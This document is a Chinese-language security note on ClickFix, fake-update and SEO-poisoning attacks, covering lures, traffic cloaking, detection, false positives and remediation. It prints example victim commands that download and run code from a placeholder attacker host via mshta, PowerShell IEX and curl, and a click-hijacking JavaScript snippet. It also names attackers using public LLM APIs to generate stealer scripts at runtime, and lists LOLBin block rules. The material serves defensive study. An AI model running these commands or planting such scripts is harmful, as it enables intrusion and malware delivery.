# ClickFix、假更新与 SEO 投毒

> 2024-2026 年最"接地气"的初始访问方式：**不投递恶意可执行文件，而是让用户自己运行一段命令或安装一个"更新"**。它绕过了邮件附件过滤、宏禁用、以及"不点击可疑附件"这类培训。

## 一、ClickFix（"自己粘贴命令"）

核心话术：伪造**验证码/人机校验/错误修复向导**，提示"按下 `Win+R` 粘贴以下命令并回车以完成验证/修复"。

```text
# 受害者实际执行的内容（示例形态）
mshta https://<attacker>/payload.hta
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/x.ps1')"
cmd /c curl -s http://<attacker>/s.bat | cmd
rundll32 %TEMP%\notepad2.dll,notepad
```

要点：

- 伪装成 Cloudflare/Google 的人机校验页、"视频编码器缺失"、"浏览器需要更新"。
- 部分链条带**诱饵数据**：URL 看似 `.7z`/`.rtf`/`.png`，实际返回 HTA/VBScript，宿主（`mshta`）只解析开头部分。
- 后续多为"手动 PE 映射 / 内存加载"，落地文件少。

## 二、假更新 + SEO 投毒 + TDS

- **SEO 投毒 / 恶意广告**：把"Chromium 更新"、"驱动更新"等关键词的假下载站推到搜索结果顶部。
- **TDS（流量分发系统）** 在点击时按 referrer、GEO、浏览器、是否数据中心 IP、点击次数等条件分流 → 分析人员复现时经常看到无害页面。
- **点击劫持式跳转**：页面可见的下载按钮 `href` 指向真实站点，但 JS 在 **捕获阶段** 拦截点击并改写目标：

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({ referrer: location.href, userDestination: extractClickedLink(e.target) }));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

特征：`document.addEventListener(..., true)` + `preventDefault()` + `stopImmediatePropagation()` + `window.open`/预开 `about:blank`；`localStorage` 限制"只触发一次"，使刷新后看到正常页面。

## 三、其他变体

- **"验证码"换成"证书更新"**：克隆国家 CERT/安全公告页面，给出批量脚本（下载 DLL + `rundll32` 执行）。
- **LLM 辅助运行时生成**：页面内调用公开 LLM API 生成窃取脚本后 `eval`，静态 HTML 无恶意代码 → 每次访问载荷不同，规避静态检测。
- **QRL 钓鱼**：通过二维码把用户引导到手机（移动端防护更弱）再执行。
- **假会议/软件安装器**（含带签名的合法工具，如远程控制软件）→ 常被误认为正常运维。

## 四、检测与验证（授权评估中）

评估此类链路时（红队视角为构造，蓝队视角为检测），要能回答：

1. 入口是什么（搜索广告、二维码、伪造校验页、假公告）。
2. 用户被要求执行什么（完整命令行）。
3. 载荷从哪来（URL/域，是否有 TDS 分层）。
4. 落地与持久化（`%TEMP%` 文件、注册表 Run、计划任务、RMM 安装）。
5. 证据：完整命令、下载 URL、进程父子关系、网络回调。

过程证据链建议采集：

```text
浏览器历史/缓存 → 落地页 URL
进程树（浏览器 → mshta/rundll32/powershell → 子进程）
DNS/HTTP 日志（含 UA 与 referrer）
```

## 五、常见误报

- 页面要求粘贴命令但**未实际执行**（用户中断、被 EDR 拦截）。
- 只下载了诱饵文件（真正的载荷被 TDS 分流走了，未命中你）。
- 用户运行的是浏览器书签或合法工具。
- 复现时 TDS 返回无害页面（需保留首次运行的网络与内存证据）。

## 六、修复（客户侧）

- **策略层**：应用控制（AppLocker/WDAC）限制 `mshta`、`rundll32`、`wscript`、`curl`、`bitsadmin`、`regsvr32` 等 LOLBin；禁止执行 `%TEMP%`、`%APPDATA%` 下的二进制。
- **浏览器层**：拦截新注册域；对企业设备启用"只允许签名/已批准安装包"。
- **网络层**：DNS/URL 过滤覆盖搜索广告域名；拦截常见 TDS 特征。
- **检测层**：`Win+R` 场景下，浏览器进程的子进程（尤其 `mshta.exe` 载入非本地契约）应高优先告警；PowerShell 脚本块日志配合 `-WindowStyle Hidden` + `FromBase64String` + `IEX` 组合告警；`rundll32` 从 `%TEMP%` 加载 DLL 告警。
- **培训层**：明确"**任何要求你在搜索框/运行框粘贴命令的操作都是攻击**"；不要依赖"不要点击附件"这一条。

## 七、参考

- HackTricks：Phishing Methodology（SEO Poisoning / ClickFix / TDS / LLM 运行时生成 章节，2025）
- 公开威胁报告中的 "ClickFix"、"Fake Update"、"TDS" 相关分析
- MITRE ATT&CK：T1204（User Execution）、T1189（Drive-by Compromise）、T1218（System Binary Proxy Execution）
